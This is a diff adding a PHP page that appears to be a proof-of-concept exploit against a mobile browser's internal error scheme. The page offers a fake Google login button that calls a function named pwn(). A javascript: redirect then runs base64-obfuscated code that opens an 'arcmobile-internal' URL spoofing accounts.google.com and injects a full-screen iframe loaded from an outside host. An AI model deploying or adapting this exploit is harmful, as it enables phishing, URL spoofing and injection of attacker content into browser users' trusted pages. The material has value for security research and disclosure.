@@ -1,0 +1,33 @@
+<?php
+
+if (isset($_GET['source']) && $_GET['source'] == 1) {
+    highlight_file(__FILE__);
+    exit;
+}
+
+if(isset($_GET['redirect'])){
+header("Location:javascript:eval(atob('YXV0aF91dWlkPW5ldyBVUkwobG9jYXRpb24uaHJlZikuc2VhcmNoUGFyYW1zLmdldCgnYXV0aF91dWlkJyk7dz13aW5kb3cub3BlbihgYXJjbW9iaWxlLWludGVybmFsOi8vZXJyb3I/b3JpZ2luYWxfdXJsPWh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS8mcmVhc29uPVJlZGlyZWN0aW9uJTIwdG8lMjBVUkwlMjB3aXRoJTIwYSUyMHNjaGVtZSUyMHRoYXQlMjBpcyUyMG5vdCUyMEhUVFAoUykmYXV0aF91dWlkPSR7YXV0aF91dWlkfSZoYXNfZGlzcGxheWVkPXRydWVgKTtzZXRUaW1lb3V0KCgpPT57dy53aW5kb3cuc3RvcCgpO3cuZG9jdW1lbnQud3JpdGUoYDxpZnJhbWUgc3JjPSdodHRwczovL3B3ci53dGYvYXJjLzEuaHRtbCcgc3R5bGU9J3Bvc2l0aW9uOmZpeGVkOyB0b3A6MDsgbGVmdDowOyBib3R0b206MDsgcmlnaHQ6MDsgd2lkdGg6MTAwJTsgaGVpZ2h0OjEwMCU7IGJvcmRlcjpub25lOyBtYXJnaW46MDsgcGFkZGluZzowOyBvdmVyZmxvdzpoaWRkZW47IHotaW5kZXg6OTk5OTk5Oyc+PC9pZnJhbWU+YCl9LDEwMCk='))");
+}
+?>
+<head>
+<meta name = "viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<style>
+html,
+body {
+  overflow-x: hidden;
+  height: 100%;
+}
+body {
+  position: relative;
+}</style></head><body>
+<center><br><br><br><h3>Login using your Google account:<br>(if got an error, Refresh the page)</h3>
+
+<img style=cursor:pointer;width:300px src=https://cdn.prod.website-files.com/5c2a9a234fdbba7439c48fa4/632cc665abbc286ce8f3e896_Screen%20Shot%202022-09-22%20at%204.11.09%20PM.webp onclick=pwn()>
+
+<script>
+
+function pwn(){
+window.open(location.href+'?&redirect=1');
+}
+
+</script>
